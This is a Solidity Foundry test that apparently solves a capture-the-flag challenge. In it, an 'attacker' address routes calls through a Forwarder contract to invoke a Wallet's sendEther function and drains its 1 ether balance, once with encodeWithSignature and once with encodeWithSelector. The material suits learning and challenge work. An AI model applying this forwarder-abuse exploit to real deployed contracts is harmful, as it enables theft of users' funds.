// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {DeployForwarderScript} from "@script/4_DeployForwarder.s.sol";
import {Wallet, Forwarder} from "@main/Forwarder.sol";

contract ForwarderTest is Test, DeployForwarderScript {

    string  mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker = address(11);

    function setUp() public {
        vm.label(attacker, "Attacker");

        vm.deal(deployer, 1 ether);

        DeployForwarderScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq( address(walletChallenge).balance, 1 ether );
        assertEq( address(attacker).balance, 0 );
        // encodeWithSignature
        bytes memory data1 = abi.encodeWithSignature("sendEther(address,uint256)",attacker, 0.5 ether );
        forwarder.functionCall(address(walletChallenge), data1);
        // encodeWithSelector
        bytes memory data2 = abi.encodeWithSelector(Wallet.sendEther.selector,attacker, 0.5 ether );
        forwarder.functionCall(address(walletChallenge), data2);

        assertEq( address(walletChallenge).balance, 0 );
        assertEq( address(attacker).balance, 1 ether );

        vm.stopPrank(  );
    }

}